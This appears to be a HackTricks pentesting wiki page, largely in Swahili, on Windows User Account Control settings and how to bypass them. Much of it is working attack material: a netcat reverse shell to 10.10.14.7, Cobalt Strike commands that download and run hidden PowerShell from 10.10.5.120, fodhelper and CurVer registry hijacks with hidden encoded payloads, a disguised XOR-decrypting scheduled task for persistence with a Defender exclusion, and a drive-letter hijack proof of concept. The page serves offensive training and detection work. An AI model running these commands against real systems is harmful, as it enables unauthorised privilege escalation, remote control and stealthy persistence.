# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **onyo la idhini kwa shughuli zilizopewa ngazi ya juu**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. Wakati UAC imewashwa, applications na tasks kawaida hulindwa chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi (non-administrator account) isipokuwa msimamizi akaruhusu waziwazi programu/hust kazi hizi kupata ufikiaji wa ngazi ya msimamizi ili ziendeshe. Ni kipengele cha urahisi kinachowalinda wasimamizi dhidi ya mabadiliko yasiyotakiwa lakini hakiwezi kuchukuliwa kama mipaka ya usalama.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wakati UAC iko, mtumiaji msimamizi anapewa tokeni 2: tokeni ya mtumiaji wa kawaida (standard user key), kwa kufanya vitendo vya kawaida kwa ngazi ya kawaida, na tokeni moja yenye vibali vya admin.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inazungumzia jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia (logon process), uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi kwa shirika lao kwa ngazi ya eneo (kutumia secpol.msc), au kusanidiwa na kusambazwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali imetajwa kwa undani [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Imezimwa)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Ombi la idhini kwa binaries zisizo za Windows kwenye desktop iliyo salama) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Ombi la taarifa za kuingia kwenye desktop iliyo salama)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Imewezeshwa; imezimwa kwa default kwenye Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Imezimwa)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Imewezeshwa)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Imewezeshwa)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Imezimwa)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Imewezeshwa)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Imewezeshwa)                                              |

### Policies for installing software on Windows

Sera za usalama za ndani (the **local security policies** — "secpol.msc" kwenye mifumo mingi) zimesanidiwa kwa default ili **kuzuia watumiaji wasio-admin kufanya usakinishaji wa programu**. Hii inamaanisha kwamba hata mtumiaji asiyekuwa admin akiweza kupakua installer ya programu yako, hatoweza kuiendesha bila akaunti ya admin.

### Registry Keys to Force UAC to Ask for Elevation

Kama mtumiaji wa kawaida bila haki za admin, unaweza kuhakikisha akaunti ya "standard" inakwekwa **kuombwa taarifa za kuingia na UAC** inapojaribu kufanya vitendo fulani. Hatua hii ingehitaji kubadilisha baadhi ya **registry keys**, kwa ambazo unahitaji ruhusa za admin, isipokuwa kuna **UAC bypass**, au mshambuliaji tayari ameingia kama admin.

Hata kama mtumiaji yuko katika kikundi cha **Administrators**, mabadiliko haya yanamlazimisha mtumiaji **kuingia tena nywila/maelezo ya akaunti yao** ili kufanya vitendo vya usimamizi.

**Hasara pekee ni kwamba mbinu hii inahitaji UAC kuzimwa ili ifanye kazi, jambo ambalo halitokei kwenye mazingira ya uzalishaji kwa kawaida.**

Registry keys na entries ambazo lazima ubadilishe ni zifuatazo (na thamani zao za default kwa mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hii pia inaweza kufanywa kwa mikono kupitia Local Security Policy tool. Mara baada ya kubadilishwa, operesheni za usimamizi zinamuomba mtumiaji kuingia tena maelezo yao.

### Note

**User Account Control is not a security boundary.** Kwa hivyo, watumiaji wa kawaida hawawezi kutoroka kutoka kwa akaunti zao na kupata haki za msimamizi bila local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Ruhusa za UAC

- Internet Explorer Protected Mode inatumia ukaguzi wa uadilifu kuzuia michakato yenye ngazi ya uadilifu ya juu (kama vichunguzi vya wavuti) kufikia data yenye ngazi ya uadilifu ya chini (kama folda ya mafaili ya muda ya Internet). Hii hufanywa kwa kuendesha browser na token ya ngazi ya uadilifu ya chini. Wakati browser inajaribu kufikia data zilizohifadhiwa katika eneo la uadilifu wa chini, mfumo wa uendeshaji hukagua kiwango cha uadilifu cha mchakato na kuruhusu ufikivu ipasavyo. Kipengele hiki husaidia kuzuia remote code execution attacks kupata ufikiaji wa data nyeti kwenye mfumo.
- Wakati mtumiaji anaingia kwenye Windows, mfumo huunda access token ambayo ina orodha ya ruhusa za mtumiaji. Ruhusa zinafafanuliwa kama mchanganyiko wa haki na uwezo wa mtumiaji. Token pia ina orodha ya credentials za mtumiaji, ambazo hutumika kumthibitisha mtumiaji kwenye kompyuta na kwenye rasilimali za mtandao.

### Autoadminlogon

Ili kusanidi Windows ili iingize mtumiaji maalum kwa otomatiki wakati wa kuanza, weka funguo la rejista la **`AutoAdminLogon`**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya upimaji. Tumia hili tu kwenye mifumo salama, kwani linafichua nenosiri kwenye rejista.

Set funguo zifuatazo kwa kutumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurudisha tabia ya kawaida ya kuingia, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una ufikiaji wa grafiki kwa mwathiri, UAC bypass ni rahisi kwani unaweza kubofya "Yes" wakati mwito wa UAC utaonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewezeshwa, mchakato wako unaendesha katika muktadha wa ngazi ya uadilifu ya wastani, na mtumiaji wako ni sehemu ya kikundi cha administrators**.

Ni muhimu kutaja kwamba ni **ngumu sana kupata UAC bypass ikiwa iko kwenye ngazi ya juu kabisa ya usalama (Always) kuliko ikiwa iko katika ngazi nyingine yoyote (Default).**

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **execute a reverse shell with admin privileges** (high integrity level) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sana** Msingi UAC "bypass" (ufikiaji kamili wa mfumo wa faili)

Ikiwa una shell na mtumiaji ambaye yuko ndani ya kundi la Administrators, unaweza **mount the C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) kieneji kwenye diski mpya na utakuwa na **access to everything inside the file system** (hata folda ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana mbinu hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina moduli kadhaa za **bypass** **UAC**.

### KRBUACBypass

Nyaraka na zana ziko katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyo** wa exploits kadhaa za **UAC bypass**. Kumbuka kwamba utahitaji **kujenga UACME kwa kutumia Visual Studio au msbuild**. Ujenzi utaunda executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unayohitaji.**  
Unapaswa **kuwa makini** kwa sababu baadhi ya bypasses zitakuwa **zinaamsha programu nyingine** ambazo zitatuma **onya** kwa **mtumiaji** kwamba kuna kitu kinaendelea.

UACME ina **toleo la build ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayoweza kuathiri toleo lako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, kwa kutumia [this](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapata Windows release `1607` kutoka kwa build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary ya kuaminika `fodhelper.exe` hupata auto-elevation kwenye Windows za kisasa. Inapoanzishwa, huulizia per-user registry path hapa chini bila kuthibitisha vazi la `DelegateExecute`. Kuweka amri huko kunaruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuanzisha mchakato wa High Integrity bila UAC prompt.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell hatua (weka payload yako, kisha ichochee)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Vidokezo:
- Inafanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC kikiwa chaguo-msingi/laini (si Always Notify ikiwa na vikwazo vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka mchakato wa 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au path ya EXE). Epuka UIs zinazotoa prompts ili kubaki kimya kwa madhumuni ya usiri.

#### CurVer/extension hijack variant (HKCU only)

Sample za hivi karibuni zinazotumia `fodhelper.exe` zinaepuka `DelegateExecute` na badala yake **redirect the `ms-settings` ProgID** kupitia thamani ya mtumiaji (`CurVer`). The auto-elevated binary bado huresolve handler chini ya `HKCU`, kwa hivyo hakuna admin token inahitajika kuwekea funguo:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Mara tu imepandishwa hadhi, malware kwa kawaida **inazima vidokezo vya baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kwa `0`, kisha hufanya mbinu za ziada za kuepuka ulinzi (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na huunda persistence upya ili kukimbia kwa hadhi ya juu. Kazi ya kawaida ya persistence huhifadhi **XOR-encrypted PowerShell script** kwenye diski na huifungua/huitekeleza ndani ya kumbukumbu kila saa:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant bado inafuta dropper na inaacha tu staged payloads, na kufanya ugunduo utegemee kufuatilia **`CurVer` hijack**, uharibu wa `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusions, au scheduled tasks ambazo zina-decrypt PowerShell kwa memory.

#### More UAC bypass

**Zote** mbinu zinazotumika hapa ku-bypass UAC **zinahitaji** **full interactive shell** na mwathiriwa (nc.exe shell ya kawaida haitoshi).

Unaweza kufikia hilo kwa kutumia session ya **meterpreter**. Migrate kwenda kwenye **process** ambayo ina thamani ya **Session** sawa na **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

Ikiwa una access kwa **GUI unaweza kukubali tu UAC prompt** unapopokea, huna haja ya bypass. Kwa hivyo, kupata access ya GUI kutakuwezesha ku-bypass UAC.

Zaidi ya hayo, ikiwa unapata GUI session ambayo mtu alikuwa akitumia (kwa mfano kupitia RDP) kuna **some tools that will be running as administrator** ambapo unaweza **run** **cmd** kwa mfano **as admin** moja kwa moja bila kuonyeshwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa kidogo zaidi ya **stealthy**.

### Noisy brute-force UAC bypass

Ikiwa haujali kuhusu kuwa noisy unaweza daima **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambayo **inauliza kuinua permissions hadi mtumiaji atakapokubali**.

### Your own bypass - Basic UAC bypass methodology

Ikiangalia **UACME** utagundua kwamba **most UAC bypasses abuse a Dll Hijacking vulnerability** (kwa kawaida kwa kuandika malicious dll kwenye _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary itakayofanya **autoelevate** (angalia kwamba inapofanywa inaendesha kwa high integrity level).
2. Kwa kutumia procmon tafuta matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
3. Huenda utahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza ku-bypass hii kwa kutumia:
1. **wusa.exe**: Windows 7,8 and 8.1. Inaruhusu kuchoma yaliyomo ya CAB file ndani ya protected paths (kwa sababu zana hii inaendeshwa kutoka high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na utekeleze binary iliyo vunuliwa na autoelevated.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **read** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayokuwa **executed** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” inatumia shadow-admin tokens zenye per-session `\Sessions\0\DosDevices/<LUID>` maps. Saraka hiyo inaundwa kwa njia ya lazy na `SeGetTokenDeviceMap` kwenye kwanza `\??` resolution. Ikiwa mshambuliaji atanakili token ya shadow-admin tu kwa **SecurityIdentification**, saraka itaundwa na mshambuliaji kama **owner** (inapata urithi `CREATOR OWNER`), ikiruhusu drive-letter links kuchukua kipaumbele juu ya `\GLOBAL??`.

**Steps:**

1. Kutoka session yenye ruhusa ndogo, piga `RAiProcessRunOnce` ili kuzalisha promptless shadow-admin `runonce.exe`.
2. Nakilisha primary token yake kuwa **identification** token na uitumikie (impersonate) wakati unaofungua `\??` kuilazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya umiliki wa mshambuliaji.
3. Tengeneza symlink ya `C:` huko ikielekeza kwenye storage inayodhibitiwa na mshambuliaji; ufikaji wa baadaye wa filesystem katika session hiyo utatafsiri `C:` kuwa kwenye njia ya mshambuliaji, kuruhusu DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Marejeo
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
